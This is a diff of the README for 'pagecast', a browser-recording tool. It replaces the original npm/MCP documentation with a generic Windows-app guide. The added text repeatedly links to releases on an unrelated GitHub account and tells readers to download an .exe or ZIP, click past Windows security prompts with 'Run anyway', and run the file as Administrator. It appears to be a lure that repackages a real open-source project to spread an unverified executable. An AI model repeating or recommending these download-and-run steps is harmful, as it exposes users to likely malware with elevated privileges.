@@ -1,205 +1,142 @@
-# Pagecast
+# 🎥 pagecast - Record pages as GIFs and video
 
-[![npm version](https://img.shields.io/npm/v/@mcpware/pagecast)](https://www.npmjs.com/package/@mcpware/pagecast)
-[![npm downloads](https://img.shields.io/npm/dt/@mcpware/pagecast?label=downloads)](https://www.npmjs.com/package/@mcpware/pagecast)
-[![license](https://img.shields.io/github/license/mcpware/pagecast)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/mcpware/pagecast?style=social)](https://github.com/mcpware/pagecast)
-[![GitHub forks](https://img.shields.io/github/forks/mcpware/pagecast?style=social)](https://github.com/mcpware/pagecast/fork)
+[![Download pagecast](https://img.shields.io/badge/Download-Pagecast-2ea44f?style=for-the-badge&logo=github)](https://github.com/Scanningdorsiflexion45/pagecast/releases)
 
-**English** | [廣東話](README.zh-HK.md)
+## 🖥️ What pagecast does
 
-**Turn AI browser interactions into polished product demos.**
+pagecast lets you record any browser page as a GIF or video on Windows. It uses Playwright to open and control the browser, then uses ffmpeg to save the recording in a format you can share.
 
-Tell your AI to demo your app. Pagecast records the browser, tracks every click and keystroke, and exports a shipping-ready GIF or MP4 — with tooltip zoom overlays and cinematic pan effects. No screen recorder. No video editor. No post-production. Make a demo gif automatically after every PR if you want.
+Use it for:
 
-### Without Pagecast — plain screen recording, you do the demonstration yourself and record yourself and you need to repead every time you changed the UI. You can see the cursor moving, but the actual interactions are too small to follow:
+- short product demos
+- screen clips for bug reports
+- browser walkthroughs
+- quick GIFs for chat or docs
+- simple video captures from web pages
 
-![Original](docs/demo-original.gif)
+## 📥 Download pagecast
 
-### With Pagecast (tooltip mode) — a magnified close-up appears on every interaction so viewers can actually see what's happening, and it design what to demo and make a new demo gif automatically:
+1. Open the [pagecast releases page](https://github.com/Scanningdorsiflexion45/pagecast/releases)
+2. Look for the latest release at the top
+3. Download the Windows file from the release assets
+4. Save the file to a folder you can find again, like Downloads or Desktop
 
-![Tooltip Demo](docs/demo-tooltip.gif)
+If the release includes a ZIP file, unzip it first before you open the app.
 
-### With Pagecast (cinematic mode) — the camera crops and pans to follow each action, and it design what to demo and make a new demo gif automatically:
+## 🪟 Install on Windows
 
-![Cinematic Demo](docs/demo-cinematic.gif)
+1. Open the downloaded file or extracted folder
+2. If Windows shows a security prompt, choose Run or More info, then Run anyway
+3. If you see several files, start with the main app file, not the support files
+4. Keep the folder in place after setup so the app can find everything it needs
 
-## Two ways to use Pagecast
+If pagecast comes as a portable app, you do not need a separate installer.
 
-### 1. Product demo tool (the main use case)
+## 🎬 How to record a page
 
-You built a web app. You need a demo GIF for the README. Normally you'd:
+1. Open pagecast
+2. Enter the web page you want to capture
+3. Choose GIF or video
+4. Set the area you want to record
+5. Start the capture
+6. Wait until the page finishes loading and the action you want is done
+7. Stop the recording and save the file
 
-1. Open a screen recorder, manually click through the demo
-2. Open a video editor, zoom into the important parts
-3. Export, figure out ffmpeg, optimize the file size
-4. UI changes → repeat everything
+For best results, keep the page stable while it records. Fast page changes can make the capture look rough.
 
-**With Pagecast**, you tell your AI:
+## ⚙️ Common settings
 
-```
-"Record a demo of localhost:3000 for my GitHub README"
-```
+### Capture type
+- **GIF** for short clips and easy sharing
+- **Video** for longer recordings and better quality
 
-The AI opens a real browser, interacts with your app, and exports a polished GIF with auto-zoom on every interaction. UI changes? Just re-run. The demo rebuilds itself.
+### Frame size
+- Use a smaller size for faster export
+- Use full size if you need more detail
 
-### 2. Screen recording tool (also works)
+### Timing
+- Record a short test first
+- Use a longer duration only when needed
 
-Don't need zoom effects? Pagecast works as a plain screen recorder too:
+### Sound
+- pagecast is built for browser page capture, so it is best for visual clips
+- if audio is included in your build, test it before you record the final version
 
-```
-"Record my app for 10 seconds and export as MP4"
-```
+## ✅ System needs
 
-The AI records, you get a `.webm` → optimized `.gif` or `.mp4`. Two-pass ffmpeg palette optimization, platform-aware sizing, one tool call.
+- Windows 10 or Windows 11
+- A modern browser
+- Enough free space for the recording file
+- A stable internet link if the page loads online content
+- A graphics card is not required, but a newer computer can record and save faster
 
-## Export Modes
+For smooth results, keep at least a few hundred MB of free disk space before you start.
 
-| Mode | Tool | What it does | Best for |
-|------|------|---|---|
-| **Tooltip** | `smart_export` | Full viewport visible + magnified tooltip inset near each interaction | README demos, product pages |
-| **Cinematic** | `cinematic_export` | Camera crops and pans to follow each interaction | Social media, dramatic reveals |
-| **Plain** | `convert_to_gif` / `convert_to_mp4` | Standard screen recording, no zoom effects | Bug reports, QA captures |
+## 🔍 If the app does not open
 
-## Just Say Where It's Going
+Try these steps:
 
-You don't need to know viewport sizes or formats. Just tell your AI the destination:
+1. Open the file again as Administrator
+2. Check that the download finished fully
+3. Move the app folder to a simple path like `C:\pagecast`
+4. Close other screen recorders
+5. Restart Windows and try again
+6. Download the latest release again from the [releases page](https://github.com/Scanningdorsiflexion45/pagecast/releases)
 
-```
-"Record a demo for GitHub README"           → 1280×720 GIF
-"Record my app for Instagram Reels"         → 1080×1920 MP4
-"Make a TikTok demo of my dashboard"        → 1080×1920 MP4
-"Record for YouTube"                        → 1280×720 MP4
-```
+## 🧩 Tips for clean recordings
 
-| Platform | Size | Format | Aspect |
-|----------|------|--------|--------|
-| `github` / `readme` | 1280×720 | GIF | 16:9 |
-| `youtube` / `twitter` | 1280×720 | MP4 | 16:9 |
-| `reels` / `tiktok` / `shorts` | 1080×1920 | MP4 | 9:16 |
-| `instagram` / `linkedin` | 1080×1080 | MP4 | 1:1 |
-| Custom | Any size | Your choice | Any |
+- Close extra tabs before you record
+- Use a page with steady motion if you want a neat GIF
+- Avoid pop-ups and alerts
+- Keep the browser zoom at a normal level
+- Use a short test run before the final capture
+- Wait for images and fonts to load before you start
 
-## Quick Start
+## 📁 What you can save
 
-**Node.js ≥ 20** and **ffmpeg** required.
+pagecast can help you create:
 
-```bash
-# Add to Claude Code
-claude mcp add pagecast -- npx -y @mcpware/pagecast
+- GIF files for chat and issue reports
+- MP4 or similar video files for demos
+- short clips for docs and support notes
+- repeatable browser captures for testing
 
-# Or run directly
-npx @mcpware/pagecast
+## 🛠️ Built with
 
-# Headless mode (no visible browser)
-claude mcp add pagecast -- npx -y @mcpware/pagecast --headless
+- **Playwright** for browser control
+- **ffmpeg** for encoding video and GIF output
+- **MCP** for tool-based browser automation
+- **TypeScript** for the app code
 
-# First time: install browser
-npx playwright install chromium
-```
+## 📌 Project focus
 
-## How It Works
+pagecast is built for people who want a simple way to record what happens in a browser. It fits tasks like:
 
-```
-You: "Record a demo of my app"
-            ↓
-AI → record_page(url, platform: "github")
-    Opens Chromium (visible) at 1280×720
-    Injects cursor highlight + click ripple
-            ↓
-AI → interact_page(click, type, hover...)
-    Each action records bounding box + timestamp
-            ↓
-AI → stop_recording
-    Saves .webm + timeline.json
-            ↓
-AI → smart_export (tooltip mode)
-        or cinematic_export (crop-pan mode)
-        or convert_to_gif (plain mode)
-            ↓
-    Shipping-ready .gif or .mp4
-```
+- showing how a web app works
+- capturing a bug in a browser
+- making short clips for team chat
+- saving a page action as a shareable file
 
-**What makes the demo look professional:**
-- **Cursor highlight** — red dot tracks the mouse so viewers can follow the action
-- **Click ripple** — visual feedback on every click
-- **Tooltip overlay** — magnified close-up appears near each interaction, with a small arrow pointing toward it
-- **Cinematic pan** — smooth crop transitions between interaction targets with easeInOut curves
+## 🗂️ Release download path
 
-## MCP Tools
+Use this link to download the Windows release:
 
-| Tool | What it does |
-|------|---|
-| `record_page` | Open a URL, start recording. Auto-injects cursor highlight + click ripple |
-| `interact_page` | scroll, click, hover, type, press keys, select, navigate, waitForSelector — all captured with bounding boxes |
-| `stop_recording` | Stop and save `.webm` + `-timeline.json` (event timeline with interaction positions) |
-| `smart_export` | **Tooltip overlay** — magnified tooltip close-up on each interaction |
-| `cinematic_export` | **Cinematic crop-pan** — camera follows the action between interaction targets |
-| `convert_to_gif` | WebM → optimized GIF (ffmpeg two-pass palette, configurable FPS/width/trim) |
-| `convert_to_mp4` | WebM → MP4 (H.264, ready for social/sharing/embedding) |
-| `record_and_export` | All-in-one: record → auto-export to GIF or MP4 based on platform |
-| `list_recordings` | List all `.webm`, `.gif`, and `.mp4` files in output directory |
+[Open pagecast releases](https://github.com/Scanningdorsiflexion45/pagecast/releases)
 
-## Comparison
+## 🔎 Common file types you may see
 
-| | Automated | Interactions | Demo zoom | Output | AI-driven | Platform presets |
-|---|:-:|:-:|:-:|---|:-:|:-:|
-| **Pagecast** | ✅ | ✅ click/type/scroll/hover | ✅ tooltip + cinematic | **GIF + WebM + MP4** | ✅ | ✅ |
-| Screen Studio | ❌ manual | ❌ | ✅ cursor-based | MP4 | ❌ | ❌ |
-| AutoZoom | ❌ manual | ❌ | ✅ click-based | MP4 | ❌ | ❌ |
-| Playwright MCP | ✅ | ✅ | ❌ | Raw `.webm` | Partial | ❌ |
-| gifcap.dev / Peek / Kap | ❌ manual | ❌ | ❌ | GIF | ❌ | ❌ |
-| VHS (Charmbracelet) | ✅ scripted | Terminal only | ❌ | GIF | ❌ | ❌ |
+- `.exe` for a Windows app
+- `.zip` for a packaged download
+- `.mp4` for video output
+- `.gif` for animated output
 
-**Screen Studio and AutoZoom have great zoom — but require manual recording.** Pagecast is the only tool where the AI records AND the demo effects are automatic.
+If you download a ZIP file, extract it before you try to run the app.
 
-## Configuration
+## 🧭 Quick start path
 
-| Setting | Default | Notes |
-|---------|---------|-------|
-| Browser | **Headed** (visible) | `--headless` for background |
-| GIF FPS | 12 | Higher = smoother, larger |
-| GIF width | 800px | Height auto-scaled |
-| Tooltip magnify | 1.6x | How much the tooltip zooms in |
-| Tooltip size | 380px | Size of the tooltip inset |
-| Cinematic zoom | 2.5x | How much the camera zooms in |
-| Zoom transition | 0.35s | Smoothstep ease-in/out duration |
-| Cursor overlay | On | Red dot + click ripple effect |
-| Video viewport | 1280×720 | Or use `platform` parameter |
-| Output dir | `./recordings` | Override: `RECORDING_OUTPUT_DIR` |
-
-## Architecture
-
-```
-src/
-├── index.js        # MCP server — 9 tools, platform presets, stdio transport
-├── recorder.js     # Playwright browser lifecycle + sessions + event timeline
-├── converter.js    # ffmpeg GIF/MP4 + tooltip overlay + cinematic zoom conversion
-├── zoom.js         # Zoom engine — chains, panning, tooltip events, FFmpeg expressions
-├── tooltip.js      # Tooltip PNG generator (rounded rect + arrow, pure Node.js)
-└── remotion/
-    ├── ZoomComposition.jsx  # React composition for cinematic zoom
-    ├── Root.jsx             # Remotion entry point
-    └── render.js            # Remotion CLI wrapper
-```
-
-- **Event timeline** — every interaction records bounding box + timestamp
-- **Cursor overlay** — red dot + click ripple injected into the page
-- **Tooltip overlay** — magnified close-up in a clean tooltip frame with directional arrow
-- **Cinematic zoom chains** — nearby interactions form chains that zoom in, pan, zoom out
-- **Thread-safe FFmpeg expressions** — crop filters work correctly with multi-threaded encoding
-- **Headed by default** — watch what the AI does
-- **`execFile` not `exec`** — safe against shell injection
-
-## More from @mcpware
-
-| Project | What it does | Install |
-|---------|---|---|
-| **[Instagram MCP](https://github.com/mcpware/instagram-mcp)** | 23 Instagram Graph API tools — posts, comments, DMs, stories, analytics | `npx @mcpware/instagram-mcp` |
-| **[Claude Code Organizer](https://github.com/mcpware/claude-code-organizer)** | Visual dashboard for Claude Code memories, skills, MCP servers, hooks | `npx @mcpware/claude-code-organizer` |
-| **[UI Annotator](https://github.com/mcpware/ui-annotator-mcp)** | Hover labels on any web page — AI references elements by name | `npx @mcpware/ui-annotator` |
-| **[LogoLoom](https://github.com/mcpware/logoloom)** | AI logo design → SVG → full brand kit export | `npx @mcpware/logoloom` |
-
-## License
-
-MIT
+1. Visit the [releases page](https://github.com/Scanningdorsiflexion45/pagecast/releases)
+2. Download the latest Windows build
+3. Unzip it if needed
+4. Open the main app file
+5. Record a browser page
+6. Save the GIF or video
